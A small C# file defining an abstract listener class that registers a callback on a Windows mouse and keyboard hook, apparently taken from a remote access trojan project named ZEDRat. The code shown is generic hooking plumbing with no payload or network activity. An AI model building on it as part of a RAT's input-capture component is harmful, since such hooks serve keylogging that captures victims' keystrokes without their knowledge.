using System;
using ZEDRatApp.ZEDRAT.MouseKeyHook.WinApi;

namespace ZEDRatApp.ZEDRAT.MouseKeyHook.Implementation
{
	internal abstract class BaseListener : IDisposable
	{
		protected HookResult Handle { get; set; }

		protected BaseListener(Subscribe subscribe)
		{
			this.Handle = subscribe(new Callback(Callback));
		}

		public void Dispose()
		{
			this.Handle.Dispose();
		}

		protected abstract bool Callback(CallbackData data);
	}
}
